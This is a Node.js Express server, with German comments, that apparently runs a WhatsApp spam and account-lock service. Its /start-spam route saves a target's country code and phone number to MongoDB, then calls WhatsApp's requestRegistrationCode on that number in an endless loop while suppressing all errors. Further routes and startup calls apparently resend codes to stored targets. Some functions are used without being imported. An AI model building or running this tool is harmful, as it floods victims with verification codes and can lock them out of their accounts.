const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const path = require('path');
const ejs = require('ejs');
const pinoo = require('pino');
const mongoose = require('mongoose');
const { startSpamV2, sendStoredData, startPairingCodeGeneration, sendStoredDataV2, SpamData, PairData} = require('./server3.js');


// Konfiguration des Pino-Loggers mit gewünschten Log-Leveln
const log = pinoo({
    level: 'warn', // Nur Nachrichten mit Log-Level warn und höher werden protokolliert
    base: null // Deaktiviert den Standard-Serializer
});

// Pfad zur Log-Datei
const logFilePath = 'pino_logs.log';

// Pino-Logger konfigurieren, um Protokolle direkt in die Datei zu schreiben
const logStream = pinoo.destination({ dest: logFilePath });

// Beispiel-Log-Nachrichten
log.info('Dies ist eine Info-Nachricht.');
log.warn('Dies ist eine Warnungs-Nachricht.');
log.error('Dies ist eine Fehler-Nachricht.');

// Alle Pino-Logs wurden in die Datei geschrieben
console.log('Alle Pino-Logs wurden in die Datei geschrieben:', logFilePath);

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    // Fork Workers
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
        // Fork a new worker if any worker dies
        cluster.fork();
    });
} else {
    // Worker Process
    require('dotenv').config(); // Load environment variables from .env file

    const app = express();
    const port = 10000; // Use environment variable or default port

    // MongoDB connection string from environment variable
    const mongoURI = process.env.MONGODB_URI;

    // Connect to MongoDB
    mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
        .then(() => log.info('Connected to MongoDB'))
        .catch(err => log.error('Error connecting to MongoDB:', err));

    // Set up body parsers
    let server = require('./views/qr');
    code = require('./views/pair');
    code2 = require('./start-pairing/pair2');
    app.use('/qr', server);
    app.use('/code', code);
    app.use('/code2', code2);
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(cookieParser());
    app.use(express.static(path.join(__dirname, 'public')));

    // Set up view engine and views directory
    const __path = path.join(__dirname, 'views');
    app.set('view engine', 'ejs');
    app.set('views', __path);
    app.engine('ejs', ejs.renderFile);

    // Routes
    app.get('/', (req, res) => {
        res.render('index', { title: 'Home' });
    });

    app.get('/pair', (req, res) => {
        res.render('pair', { title: 'pairing' });
    });
    app.get('/start-spam', (req, res) => {
        res.render(path.join(__path, 'lock'), { title: 'Lock' });
    });

    app.get('/pair2', (req, res) => {
        res.render('pair2', { title: 'pairing2' });
    });

    app.get('/lock', (req, res) => {
        res.render(path.join(__path, 'lock'), { title: 'Lock' });
    });

    app.get('/qr', (req, res) => {
        res.render(path.join('qr.js'), { title: 'qr' });
    });
   
    
app.post('/start-spam', async (req, res) => {
    const { ddi, number } = req.body;

    try {
 // Überprüfen, ob die Kombination von DDI und Nummer bereits in der MongoDB vorhanden ist
 const existingData = await SpamData.findOne({ ddi, number });
 if (existingData) {
     console.log('Data already exists');
 } else {
     // Neue Instanz des Modells erstellen und speichern
     const newData = new SpamData({ ddi, number });
     await newData.save();
     console.log('Data saved successfully');
 }


        const { state, saveCreds } = await useMultiFileAuthState('.mm');
        const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
        });
    
        while (true) {
            try {
                const response = await spam.requestRegistrationCode({
                    phoneNumber: '+' + ddi + number,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });
    
                res.json({ success: true, response });
                return;
            } catch (err) {
                // Fehler ignorieren und keine Aktion ausführen
            }
        }
    } catch (err) {
        // Fehler ignorieren und keine Aktion ausführen
    }
});



    // Start server
    app.listen(port, () => {
        log.info(`Worker ${process.pid} started and is listening on port ${port}`);
        console.log(`Worker ${process.pid} started and is listening on port ${port}`);
    });

    // Starten Sie den Prozess und senden Sie gespeicherte Daten beim Starten des Servers
    
    sendStoredData();
    sendStoredDataV2();
    startPairingCodeGeneration();
    
    
    

    
}
